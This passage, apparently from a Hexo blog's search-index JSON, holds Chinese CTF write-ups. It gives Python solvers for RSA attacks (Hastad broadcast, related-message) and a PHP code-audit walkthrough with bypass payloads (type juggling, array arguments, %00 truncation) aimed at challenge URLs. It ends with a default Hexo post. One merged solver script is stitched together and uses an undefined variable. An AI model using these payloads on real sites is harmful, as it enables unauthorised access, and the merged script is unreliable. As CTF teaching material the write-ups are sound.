libnum\ne=3\n\nn_0=0x9c94fecac76f9c5524d994d51efc1f02ad40fcf9cd5409d7c9f86a9f10e31b6c73d8bc02df743fea939acbcf9f81a748914fce0f8df1155c0f29faac38bd70b322eb7bc69c130720bdcb2ad2cbb84ad182b36e93170d81cb3a68969c850519e86b6a3676534cdbe85c9429c058230d58527d8028c134d6078cbb89faa071848f\nct_0=0x5e3b988abb38c33e145bbc16f56ec192253d26cc053d4f78e073d0d035eda4ea91f33ec7f7cd1a56165cae95a86e0a4edabb83743966b3a4621bb33753aec5fa4b1c6d80e0d404c19c6659c8ff6dc4f5539a5dbae659ca4f24f4c53a65c5c42bf9de04852c098841d2affe83c59be99b6ecd857e232cb008c657e1f55137bf06\nn_1=0x409a8a39fcb302f0660f0a85b6d43636dce5b4797b6f3ef0b4972f70b6e0c74038c55ba50e0c918057e9ceaee024ae81da2faede8b5b66caae6892943a8892ad98b1f6f208b8b5ded753e6b8c6b94c5faf67314384f3f26e3dca579237893f098c90b0f8b80692aed4606947d656b74b69444ba0dc24b9c66a339f7a50f52783\nct_1=0xc5381d89ca5be27f43c30dbc395ce0d5b8a69adb80dc05d7f5d8dffc1b2fb76d2ab656f5659b9280c9cac83addcc0eb58e86f8e07a37f28b0500ab75bde4eb2b2e6631eeeb6bbe146c889b2ac6046864977aaee7292676fdbd4fb987940a83a94c3d04aef256b50d304d945528c69866acf591f914c0e50e012734827143ed7\nn_2=0x56a700d8f04da68c6cdb08e04a0cb2fa332389e10c1a3c94b220cb39144fc971c804ab02637303866040c13814194d863814453eec48db6136741d3a599cf890c678114b65dc60da2bbd29651bd0148f8949d69c4b18460ad0e1908eba384a1b51041e41caf70fed285fb34a8e56f04487d6d8b5d88f2a88d88565ef6757a697\nct_2=0x73e58f11dd9f637a7a7c05f6223ee95cb6d34a77583bfc6ca675955d51dd15ff4561654264e9985fcb2e87e3ddda7d6d7620cee80a1f2c20944d5d6f456a3e892f74b6745ddecbe3447825bf44344fc9e0839bdaebcca8352075675ffc8fee8c3698a87f3110f4004fea88c3faf05e5a527854e759e315b487b49e8ff9510cb\n\n\nN_012 = n_0 * n_1 * n_2\n# n1 * n2\nm_s_0 = n_1 * n_2\n# n0 * n2\nm_s_1 = n_0 * n_2\n# n0 * n1\nm_s_2 = n_0 * n_1\ncrt = libnum.solve_crt([ct_0,ct_1,ct_2], [n_0,n_1,n_2])\nc_0 = crt % n_0\nc_1 = crt % n_1\nc_2 = crt % n_2\nresult = ((c_0 * m_s_0 * libnum.invmod(m_s_0, n_0)) + (c_1 * m_s_1 * libnum.invmod(m_s_1, n_1)) + (c_2 * m_s_2 * libnum.invmod(m_s_2, n_2))) % N_012\npt = libnum.nroot(result, 3)\nprint libnum.n2s(pt).encode('hex')\n#380185242a03c9d6ca7a2e117490ebaf03a493b1250f4e248c732c2714eb6b9fd2fa4c90a4f1d8120ffbafb3b7fda85fff46a67a1da3e316392ec267e1fa7c27\n```\n\n### challenge5 -- Related Message Attack\n```\n[++++++++++++++++]challenge 4 completed[++++++++++++++++]\n[+]Generating challenge 5\n[+]n=0x1bda683489ec09b15aa5ab9356db56e8586f03879e19bf4b2316b56332fd2d994ae8682d121373b21771eda5246b3565c52266e83bada43723bb8f4457d712f339d350d02bcd257923fb6b7ad265bafd4b9429943ba56f0d27b123962adf60b809f886a090e3472abe01e194dbc3ec1ecba2550d695e771d3f0edb9ada77f29L\n[+]e=3\n[+]m=random.getrandbits(512)\n[+]c=pow(m,e,n)=0x22573b528e5ca137dc93b7f17f04d4efbf82124215a9c28ae6823fe5c7b6fb5eb5d328d9f6dbf73f88f59add74630d0721a822f8fb884b314f4c45aae1358fc8a19c59bbc370463541d58bd9cda1d77575a443cfbd85bdba48ae3e01642811a0b9824e3c8df8c02caed7a0606ceb6695dca7372e4291c60a98ed56b9442434L\n[+]x=pow(m+1,e,n)=0xe5ac2d53cd385143472febb8d7ba4acb7697bd494ef9ea0d165dd2ba7e451d803e45076ded5ef44bec0b72052b932348a50f0c66c6641159518f5137140a4db9fc497982930801715468932913e257f8b2abe287244d1d087c0ecf679cb46b1957bef678dee094d650a97d5a9d53cab80986571d890fbcd024528d6a321ac9L\n[-]long_to_bytes(m).encode('hex')=\n```\n\n```python\nimport hashlib\nimport gmpy2\nimport libnum\nfrom Crypto.Util.number import *\n\nn = 0x1bda683489ec09b15aa5ab9356db56e8586f03879e19bf4b2316b56332fd2d994ae8682d121373b21771eda5246b3565c52266e83bada43723bb8f4457d712f339d350d02bcd257923fb6b7ad265bafd4b9429943ba56f0d27b123962adf60b809f886a090e3472abe01e194dbc3ec1ecba2550d695e771d3f0edb9ada77f29\ne = 3\n\nc1 = 0x22573b528e5ca137dc93b7f17f04d4efbf82124215a9c28ae6823fe5c7b6fb5eb5d328d9f6dbf73f88f59add74630d0721a822f8fb884b314f4c45aae1358fc8a19c59bbc370463541d58bd9cda1d77575a443cfbd85bdba48ae3e01642811a0b9824e3c8df8c02caed7a0606ceb6695dca7372e4291c60a98ed56b9442434\nc2 = 0xe5ac2d53cd385143472febb8d7ba4acb7697bd494ef9ea0d165dd2ba7e451d803e45076ded5ef44bec0b72052b932348a50f0c66c6641159518f5137140a4db9fc497982930801715468932913e257f8b2abe287244d1d087c0ecf679cb46b1957bef678dee094d650a97d5a9d53cab80986571d890fbcd024528d6a321ac9\n\n\na = 1\nb = -1\npadding2 = 1\ndef getM2(a,b,c1,c2,n):\n    a3 = pow(a,3,n)\n    b3 = pow(b,3,n)\n    first = c1-a3*c2+2*b3\n    first = first % n\n    second = 3*b*(a3*c2-b3)\n    second = second % n\n    third = second*gmpy2.invert(first,n)\n    third = third % n\n    fourth = (third+b)*gmpy2.invert(a,n)\n    return fourth % n\nm = getM2(a,b,c1,c2,n)-padding2\nprint \"m==\\n\" + hex(m) + \"\\n\"\n\n#print m\nc = pow(m,e,n)\n#print hex(c)\nif c == c1:\n\tprint \"yeah\"\n```\n\n### challenge6 -- Boneh and Durfee attack\n```\n[++++++++++++++++]challenge 5 completed[++++++++++++++++]\n[+]Generating challenge 6\n[+]n=0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L\n[+]d=random.getrandbits(1024*0.270)\n[+]e=invmod(d,phin)\n[+]hex(e)=0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL\n[+]m=random.getrandbits(512)\n[+]c=pow(m,e,n)=0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL\n[-]long_to_bytes(m).encode('hex')=\n\n```\nGitHub开源项目RSA-and-LLL-attacks\n解密可得\n\n```python\nimport gmpy2\n\nimport libnum\ne=3\n\nn_0=0x9c94fecac76f9c5524d994d51efc1f02ad40fcf9cd5409d7c9f86a9f10e31b6c73d8bc02df743fea939acbcf9f81a748914fce0f8df1155c0f29faac38bd70b322eb7bc69c130720bdcb2ad2cbb84ad182b36e93170d81cb3a68969c850519e86b6a3676534cdbe85c9429c058230d58527d8028c134d6078cbb89faa071848f\nct_0=0x5e3b988abb38c33e145bbc16f56ec192253d26cc053d4f78e073d0d035eda4ea91f33ec7f7cd1a56165cae95a86e0a4edabb83743966b3a4621bb33753aec5fa4b1c6d80e0d404c19c6659c8ff6dc4f5539a5dbae659ca4f24f4c53a65c5c42bf9de04852c098841d2affe83c59be99b6ecd857e232cb008c657e1f55137bf06\nn_1=0x409a8a39fcb302f0660f0a85b6d43636dce5b4797b6f3ef0b4972f70b6e0c74038c55ba50e0c918057e9ceaee024ae81da2faede8b5b66caae6892943a8892ad98b1f6f208b8b5ded753e6b8c6b94c5faf67314384f3f26e3dca579237893f098c90b0f8b80692aed4606947d656b74b69444ba0dc24b9c66a339f7a50f52783\nct_1=0xc5381d89ca5be27f43c30dbc395ce0d5b8a69adb80dc05d7f5d8dffc1b2fb76d2ab656f5659b9280c9cac83addcc0eb58e86f8e07a37f28b0500ab75bde4eb2b2e6631eeeb6bbe146c889b2ac6046864977aaee7292676fdbd4fb987940a83a94c3d04aef256b50d304d945528c69866acf591f914c0e50e012734827143ed7\nn_2=0x56a700d8f04da68c6cdb08e04a0cb2fa332389e10c1a3c94b220cb39144fc971c804ab02637303866040c13814194d863814453eec48db6136741d3a599cf890c678114b65dc60da2bbd29651bd0148f8949d69c4b18460ad0e1908eba384a1b51041e41caf70fed285fb34a8e56f04487d6d8b5d88f2a88d88565ef6757a697\nct_2=0x73e58f11dd9f637a7a7c05f6223ee95cb6d34a77583bfc6ca675955d51dd15ff4561654264e9985fcb2e87e3ddda7d6d7620cee80a1f2c20944d5d6f456a3e892f74b6745ddecbe3447825bf44344fc9e0839bdaebcca8352075675ffc8fee8c3698a87f3110f4004fea88c3faf05e5a527854e759e315b487b49e8ff9510cb\n\n\nN_012 = n_0 * n_1 * n_2\n# n1 * n2\nm_s_0 = n_1 * n_2\n# n0 * n2\nm_s_1 = n_0 * n_2\n# n0 * n1\nm_s_2 = n_0 * n_1\ncrt = libnum.solve_crt([ct_0,ct_1,ct_2], [n_0,n_1,n_2])\nc_0 = crt % n_0\nc_1 = crt % n_1\nc_2 = crt % n_2\nresult = ((c_0 * m_s_0 * libnum.invmod(m_s_0, n_0)) + (c_1 * m_s_1 * libnum.invmod(m_s_1, n_1)) + (c_2 * m_s_2 * libnum.invmod(m_s_2, n_2))) % N_012\npt = libnum.nroot(result, 3)\nprint libnum.n2s(pt).encode('hex')\n\ndef getM2(a,b,c1,c2,n):\n    a3 = pow(a,3,n)\n    b3 = pow(b,3,n)\n    first = c1-a3*c2+2*b3\n    first = first % n\n    second = 3*b*(a3*c2-b3)\n    second = second % n\n    third = second*gmpy2.invert(first,n)\n    third = third % n\n    fourth = (third+b)*gmpy2.invert(a,n)\n    return fourth % n\nm = getM2(a,b,c1,c2,n)-padding2\nprint libnum.n2s(m)\n```\n```python\nimport hashlib\nimport gmpy2\nimport libnum\nfrom Crypto.Util.number import *\n\nn = 0x1bda683489ec09b15aa5ab9356db56e8586f03879e19bf4b2316b56332fd2d994ae8682d121373b21771eda5246b3565c52266e83bada43723bb8f4457d712f339d350d02bcd257923fb6b7ad265bafd4b9429943ba56f0d27b123962adf60b809f886a090e3472abe01e194dbc3ec1ecba2550d695e771d3f0edb9ada77f29\ne = 3\n\nc1 = 0x22573b528e5ca137dc93b7f17f04d4efbf82124215a9c28ae6823fe5c7b6fb5eb5d328d9f6dbf73f88f59add74630d0721a822f8fb884b314f4c45aae1358fc8a19c59bbc370463541d58bd9cda1d77575a443cfbd85bdba48ae3e01642811a0b9824e3c8df8c02caed7a0606ceb6695dca7372e4291c60a98ed56b9442434\nc2 = 0xe5ac2d53cd385143472febb8d7ba4acb7697bd494ef9ea0d165dd2ba7e451d803e45076ded5ef44bec0b72052b932348a50f0c66c6641159518f5137140a4db9fc497982930801715468932913e257f8b2abe287244d1d087c0ecf679cb46b1957bef678dee094d650a97d5a9d53cab80986571d890fbcd024528d6a321ac9\n\n\na = 1\nb = -1\npadding2 = 1\ndef getM2(a,b,c1,c2,n):\n    a3 = pow(a,3,n)\n    b3 = pow(b,3,n)\n    first = c1-a3*c2+2*b3\n    first = first % n\n    second = 3*b*(a3*c2-b3)\n    second = second % n\n    third = second*gmpy2.invert(first,n)\n    third = third % n\n    fourth = (third+b)*gmpy2.invert(a,n)\n    return fourth % n\nm = getM2(a,b,c1,c2,n)-padding2\nprint long_to_bytes(m).encode('hex')\n\n#print m\nc = pow(m,e,n)\n#print hex(c)\nif c == c1:\n\tprint \"yeah\"\n```\n\n## 参考链接\nhttp://www.realwz.com/2018/03/rsainctf.html\nhttp://inaz2.hatenablog.com/entry/2016/01/20/022936\nhttps://findneo.github.io/180727rsa-attack/\nhttps://www.cnblogs.com/WangAoBo/p/7541481.html\nhttps://code.felinae98.cn/ctf/crypto/rsa%e5%a4%a7%e7%a4%bc%e5%8c%85%ef%bc%88%e4%ba%8c%ef%bc%89coppersmith-%e7%9b%b8%e5%85%b3/\nhttps://www.anquanke.com/post/id/158944#h2-4\nhttps://altman.vip/2018/07/23/RSA-STUDY/#0x06-Lattice-based-attacks-on-RSA\n","tags":["Crypto","RSA"],"categories":["CTF"]},{"title":"BUGKUCTF-代码审计","url":"/2019/07/13/BUGKUCTF-代码审计/","content":"### extract变量覆盖\n```php\n<?php\n$flag='xxx';\nextract($_GET);\nif(isset($shiyan))\n{\n$content=trim(file_get_contents($flag));\n#trim() 函数移除字符串两侧的空白字符或其他预定义字符。\n#file_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。\nif($shiyan==$content)\n{\necho'flag{xxx}';\n}\nelse\n{\necho'Oh.no';\n}\n}?>\n```\nextract()函数, 将GET方式获得的变量导入到当前的符号表中\n如果变量shiyan和变量content的值相同，\n就输出flag的值\n否则就输出Oh,no\n因为extract()会把符号表中已存在的变量名的值替换掉，所以Payload ：`?shiyan=&content= `\n\n那么在使用函数extract()的时候, 如何防止这种漏洞呢\n可以在使用的时候加上参数EXTR_SKIP\n这个参数表示如果有冲突，不覆盖已有的变量\n或者还有EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 prefix。\n\n### strcmp比较字符串\n源码\n```php\n<?php\n$flag = \"flag{xxxxx}\";\nif (isset($_GET['a'])) {\nif (strcmp($_GET['a'], $flag) == 0)\n //如果 str1 小于 str2 返回 < 0； 如果 str1大于 str2返回 > 0；如果两者相等，返回 0。\n//比较两个字符串（区分大小写）\ndie('Flag: '.$flag);\nelse\nprint 'No';\n}\n?>\n```\n解这道题，就只要传入一个非字符串类型的变量即可，一般情况下，我们我们传数组，所以payload为：?a[]=123\n\n### urldecode二次编码绕过\n源码\n```php\n<?php\nif(eregi(\"hackerDJ\",$_GET[id]))//eregi()函数在一个字符串搜索指定的模式的字符串\n{\necho(\"not allowed!\");\nexit();\n}\n$_GET[id] = urldecode($_GET[id]);\nif($_GET[id] == \"hackerDJ\")\n{\necho \"Access granted!\";\necho \"flag\";\n}\n?>\n```\n就是需要构造get链接就可以得到答案：利用了两次urldecode第一次是浏览器的解码第二次是函数的解码\n\n### md5()函数\n```php\n<?php\nerror_reporting(0);\n$flag = 'flag{test}';\nif (isset($_GET['username']) and isset($_GET['password'])) {\nif ($_GET['username'] == $_GET['password'])\nprint 'Your password can not be your username.';\nelse if (md5($_GET['username']) === md5($_GET['password']))\ndie('Flag: '.$flag);\nelse\nprint 'Invalid password';\n}\n?>\n```\n*    松散比较：使用两个等号 == 比较，只比较值，不比较类型。\n*    严格比较：用两个等号 === 比较，除了比较值，也比较类型。\nmd5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。\npayload= `http://123.206.87.240:9009/18.php?username[]=1&password[]=0`\n\n### 数组返回NULL绕过\n源码 [题目地址](http://123.206.87.240:9009/19.php)\n\n```php\n\n<?php\n$flag = \"flag\";\n\nif (isset ($_GET['password'])) {\nif (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)\necho 'You password must be alphanumeric';\nelse if (strpos ($_GET['password'], '--') !== FALSE)//查找 \"--\" 在字符串中第一次出现的位置\ndie('Flag: ' . $flag);\nelse\necho 'Invalid password';\n}\n?>\n\n```\npayload`http://123.206.87.240:9009/19.php?password[]=1223`自己都搞不懂为什么\n先来谈论一下标准的答案：\n第一个条件：\n*    必须以数字或者字母开头（其实看到ereg就可以想到%00截断）\n\n第二个条件：\n*    必须在password参数中找到--。\n\n所以得出以下正解：\n`index.php?password=a%00--`\n那么话又说回来了，为什么直接password[]=a就可以绕过呢？\n1.ereg只能处理字符，而你是数组，所以返回的是null，三个等号的时候不会进行类型转换。所以null不等于false。\n2.strpos的参数同样不能够是数组，所以返回的依旧是null，null不等于false也是正确。\n所以可以拿到flag\n\n### 弱类型整数大小比较绕过\n[传送门]([http://123.206.87.240:9009/22.php]\n(http://123.206.87.240:9009/22.php)\n)\n```php\n$temp = $_GET['password'];\nis_numeric($temp)?die(\"no numeric\"):NULL;\nif($temp>1336){\necho $flag;\n```\n* payload`http://123.206.87.240:9009/22.php?password=1444a`还是不知道为什么...\n* payload`http://123.206.87.240:9009/22.php?password[]=1`\nPHP数组有一个缺陷就是大多数的函数都没有办法去判断数组。\n* payload`http://120.24.86.145:9009/22.php?password=2345%20`或者`http://120.24.86.145:9009/22.php?password=2345%00`\nis_numeric()函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对于第一个空格字符会跳过空格字符判断，接着后面的判断。\n\n### sha()函数比较绕过\n```php\n<?php\n$flag = \"flag\";\nif (isset($_GET['name']) and isset($_GET['password']))\n{\nvar_dump($_GET['name']);\necho \"\";\nvar_dump($_GET['password']);\nvar_dump(sha1($_GET['name']));\nvar_dump(sha1($_GET['password']));\nif ($_GET['name'] == $_GET['password'])\necho 'Your password can not be your name!';\nelse if (sha1($_GET['name']) === sha1($_GET['password']))\ndie('Flag: '.$flag);\nelse\necho 'Invalid password.';\n}\nelse\necho 'Login first!';\n?>\n```\n* payload`http://123.206.87.240:9009/7.php?name[]=1&password[]=0`\n\n利用sha1函数不能处理数组进行构造payload\n代码审计需要满足三个条件：\n1. if (isset(GET[′name′])andisset(_GET['password'])) ==》TRUE\n 2. if (GET[′name′]==_GET['password']) ==》FALSE\n3. if sha1(GET[′name′])===sha1(_GET['password'])) ==》TRUE\n\n### md5加密相等绕过\n```php\n<?php\n$md51 = md5('QNKCDZO');\n$a = @$_GET['a'];\n$md52 = @md5($a);\nif(isset($a)){\nif ($a != 'QNKCDZO' && $md51 == $md52) {\necho \"flag{*}\";\n} else {\necho \"false!!!\";\n}}\nelse{echo \"please input a\";}\n?>\n```\npayload`http://123.206.87.240:9009/13.php?a=s878926199a`弱类型比较\n\n\n### 十六进制与数字比较\n```php\n<?php\nerror_reporting(0);\nfunction noother_says_correct($temp)\n{\n$flag = 'flag{test}';\n$one = ord('1'); //ord — 返回字符的 ASCII 码值\n$nine = ord('9'); //ord — 返回字符的 ASCII 码值\n$number = '3735929054';\n// Check all the input characters!\nfor ($i = 0; $i < strlen($number); $i++)\n{\n// Disallow all the digits!\n$digit = ord($temp{$i});\nif ( ($digit >= $one) && ($digit <= $nine) )\n{\n// Aha, digit not allowed!\nreturn \"flase\";\n}\n}\nif($number == $temp)\nreturn $flag;\n}\n$temp = $_GET['password'];\necho noother_says_correct($temp);\n?>\n```\n定义了一个function `noother_says_correct`\n首先分析代码，函数要求变量$temp不能存在1-9之间的数字，\n最后，又要求$temp=3735929054;\n这本来是自相矛盾的，但php在转码时会把16进制转化为十进制.于是把\n3735929054转换成16进制为0xdeadc0de，记得带上0x；\n构造payload\n`password=0xdeadc0de`\n\n### 变量覆盖\n服务器被覆盖了..\n\n### 0x11 - ereg正则%00截断\n```php\n<?php\n$flag = \"xxx\";\nif (isset ($_GET['password']))\n{\nif (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE)\n{\necho 'You password must be alphanumeric';\n}\nelse if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)\n{\nif (strpos ($_GET['password'], '*-*') !== FALSE) //strpos — 查找字符串首次出现的位置\n{\ndie('Flag: ' . $flag);\n}\nelse\n{\necho('- have not been found');\n}\n}\nelse\n{\necho 'Invalid password';\n}\n}\n?>\n```\n1. if (ereg (\"^[a-zA-Z0-9]+\",_GET['password']) === FALSE)  ==》 FLASE\n2. if (strlen(_GET['password']) < 8 &&_GET['password'] > 9999999)    //正常感觉矛盾，但是可以利用科学计数法绕过1e8 > 9999999\n3. if (strpos ($_GET['password'], '*-*') !== FALSE)   //password的值应包含字符串'*-*'\n构造payload：\n>`http://123.206.87.240:9009/5.php?password=1e8%00*-*\n http://123.206.87.240:9009/5.php?password[]=`\n\n### strpos数组绕过\n```php\n<?php\n$flag = \"flag\";\nif (isset ($_GET['ctf'])) {\nif (@ereg (\"^[1-9]+$\", $_GET['ctf']) === FALSE)\necho '必须输入数字才行';\nelse if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)\ndie('Flag: '.$flag);\nelse\necho '骚年，继续努力吧啊~';\n}\n?>\n```\npayload`http://123.206.87.240:9009/15.php?ctf[]=`\n\n### 数字验证正则绕过\n\n```php\n<?php\nerror_reporting(0);\n$flag = 'flag{test}';\nif (\"POST\" == $_SERVER['REQUEST_METHOD'])\n{\n$password = $_POST['password'];\nif (0 >= preg_match('/^[[:graph:]]{12,}$/', $password)) //preg_match — 执行一个正则表达式匹配\n{\necho 'flag';\nexit;\n}\nwhile (TRUE)\n{\n$reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/';\nif (6 > preg_match_all($reg, $password, $arr))\nbreak;\n$c = 0;\n$ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母\nforeach ($ps as $pt)\n{\nif (preg_match(\"/[[:$pt:]]+/\", $password))\n$c += 1;\n}\nif ($c < 3) break;\n//>=3，必须包含四种类型三种与三种以上\nif (\"42\" == $password) echo $flag;\nelse echo 'Wrong password';\nexit;\n}\n}\n?>\n```\n利用preg_match()函数不能处理数组进行构造payload\npayload`post : password[]=`\n","tags":["web"],"categories":["CTF"]},{"title":"Hello World","url":"/2018/10/10/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n"}]